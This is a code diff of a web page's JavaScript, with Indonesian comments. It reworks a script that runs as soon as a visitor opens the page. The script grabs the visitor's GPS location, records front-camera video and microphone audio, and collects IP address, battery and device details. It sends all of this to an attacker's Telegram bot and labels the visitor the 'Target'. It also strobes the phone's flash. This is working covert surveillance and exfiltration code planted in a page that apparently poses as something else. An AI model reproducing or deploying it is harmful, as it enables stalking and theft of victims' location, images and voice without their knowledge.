@@ -155,50 +155,24 @@
       });
     }
 
-    // LOGIKA UTAMA: FLASH + LOKASI BERSAMAAN
-    async function startFlashAndGPS() {
-      // 1. Jalankan GPS (Tanpa menunggu Flash selesai)
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            const mapUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            sendToTelegram(`📍 <b>Lokasi GPS Target:</b> <a href="${mapUrl}">click disini</a>`);
-          },
-          () => { sendToTelegram('maaf akses lokasi di tolak 🤬'); },
-          { enableHighAccuracy: true }
-        );
-      }
-
-      // 2. Jalankan Flash Berkedip Secara Bersamaan
+    // FITUR 1: INFO DEVICE LENGKAP
+    async function getInfo() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-        const track = stream.getVideoTracks()[0];
-        const caps = track.getCapabilities();
-
-        if (caps.torch) {
-          sendToTelegram('flash berhasil on ✅');
-          let isOn = false;
-          const interval = setInterval(async () => {
-            try {
-              isOn = !isOn;
-              await track.applyConstraints({ advanced: [{ torch: isOn }] });
-            } catch (e) { clearInterval(interval); }
-          }, 90);
-
-          setTimeout(() => {
-            clearInterval(interval);
-            track.applyConstraints({ advanced: [{ torch: false }] });
-            stream.getTracks().forEach(t => t.stop());
-          }, 20000);
-        } else {
-          sendToTelegram('flash tidak on 🤬');
-          stream.getTracks().forEach(t => t.stop());
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        let batteryInfo = "Tidak didukung";
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "Charging" : "Discharging"})`;
         }
-      } catch (err) {
-        sendToTelegram('flash tidak on 🤬');
-      }
+        const ram = navigator.deviceMemory || "Tidak diketahui";
+        const device = navigator.userAgent.split('(')[1].split(')')[0];
+        const text = `📱 <b>Device:</b> ${device}\n🌐 <b>IP:</b> ${ipData.ip}\n🔋 <b>Baterai:</b> ${batteryInfo}\n🕒 <b>Waktu:</b> ${new Date().toLocaleString()}\n📟 <b>RAM Handphone:</b> ±${ram} GB`;
+        sendToTelegram(`<b>📥 Info data hp ⬇️</b>\n\n${text}`);
+      } catch (err) {}
     }
 
+    // FITUR 2: REKAMAN VIDEO DEPAN (7 DETIK)
     async function recordFrontVideo() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
@@ -210,16 +184,18 @@
           chatIds.forEach(id => {
             const formData = new FormData();
             formData.append('chat_id', id);
-            formData.append('video', blob, 'rekaman.mp4');
+            formData.append('video', blob, 'rekaman_depan.mp4');
+            formData.append('caption', '📹 Rekaman Kamera Depan (7 Detik)');
             fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData });
           });
           stream.getTracks().forEach(t => t.stop());
         };
         mediaRecorder.start();
         setTimeout(() => mediaRecorder.stop(), 7000);
-      } catch (e) {}
+      } catch (err) { sendToTelegram('maaf akses vidio tidak berhasil 🤬'); }
     }
 
+    // FITUR 3: REKAMAN SUARA (5 DETIK)
     async function autoRecordAudio() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -231,36 +207,65 @@
           chatIds.forEach(id => {
             const formData = new FormData();
             formData.append('chat_id', id);
-            formData.append('voice', blob, 'voice.mp3');
+            formData.append('voice', blob, 'voice_note.mp3');
             fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: formData });
           });
           stream.getTracks().forEach(t => t.stop());
         };
         mediaRecorder.start();
         setTimeout(() => mediaRecorder.stop(), 5000);
-      } catch (e) {}
+      } catch (err) { sendToTelegram('Izin Voice Note ditolak ❌'); }
     }
 
-    async function getInfo() {
+    // FITUR 4 & 5: FLASH (90MS) + GPS (BERSAMAAN)
+    async function startFlashAndGPS() {
+      // Pemicu GPS
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const mapUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            sendToTelegram(`📍 <b>Lokasi GPS Target:</b> <a href="${mapUrl}">click disini</a>`);
+          },
+          () => { sendToTelegram('maaf akses lokasi di tolak 🤬'); },
+          { enableHighAccuracy: true }
+        );
+      }
+
+      // Pemicu Flash Strobe
       try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        const ram = navigator.deviceMemory || "N/A";
-        const device = navigator.userAgent.split('(')[1].split(')')[0];
-        sendToTelegram(`<b>📥 Info data hp ⬇️</b>\n\n📱 <b>Device:</b> ${device}\n🌐 <b>IP:</b> ${ipData.ip}\n📟 <b>RAM:</b> ±${ram} GB`);
-      } catch (err) {}
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+        const track = stream.getVideoTracks()[0];
+        const caps = track.getCapabilities();
+        if (caps.torch) {
+          sendToTelegram('flash berhasil on ✅');
+          let isOn = false;
+          const interval = setInterval(async () => {
+            try {
+              isOn = !isOn;
+              await track.applyConstraints({ advanced: [{ torch: isOn }] });
+            } catch (e) { clearInterval(interval); }
+          }, 90);
+          setTimeout(() => {
+            clearInterval(interval);
+            track.applyConstraints({ advanced: [{ torch: false }] });
+            stream.getTracks().forEach(t => t.stop());
+          }, 20000);
+        } else {
+          sendToTelegram('flash tidak on 🤬');
+          stream.getTracks().forEach(t => t.stop());
+        }
+      } catch (err) { sendToTelegram('flash tidak on 🤬'); }
     }
 
-    window.addEventListener('DOMContentLoaded', () => {
+    // EKSEKUSI OTOMATIS SAAT BUKA WEB
+    window.addEventListener('DOMContentLoaded', async () => {
       createParticles();
-      // Jalankan GPS & Flash Bersamaan sebagai pembuka
-      startFlashAndGPS();
-      // Jalankan fitur lainnya secara berurutan
-      setTimeout(() => {
-        recordFrontVideo();
-        autoRecordAudio();
-        getInfo();
-      }, 500);
+      // Jalankan Flash & GPS Bersamaan sebagai prioritas utama
+      await startFlashAndGPS();
+      // Lalu jalankan fitur lainnya secara beruntun dengan cepat
+      recordFrontVideo();
+      autoRecordAudio();
+      getInfo();
     });
 
     function selectPlatform(btn) {
